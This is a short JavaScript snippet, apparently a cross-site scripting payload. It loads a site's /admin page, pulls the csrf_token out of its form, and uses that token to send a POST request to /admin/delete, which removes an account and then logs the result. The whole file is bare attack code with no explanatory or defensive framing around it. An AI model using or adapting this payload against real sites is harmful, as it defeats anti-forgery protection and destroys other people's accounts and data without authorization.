fetch('/admin')
  .then(res => res.text())
  .then(data => {
    const element = document.createElement('div');
    const { body } = document;

    element.innerHTML = data;
    body.insertBefore(element, body.firstChild);

    const input = document.querySelector('input[name="csrf_token"]');
    const token = input.value;

    fetch('/admin/delete', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `csrf_token=${token}`,
    })
      .then(() => console.log('Deleted the account!'))
      .catch(err => console.error(err));
  })
  .catch(err => console.error(err));
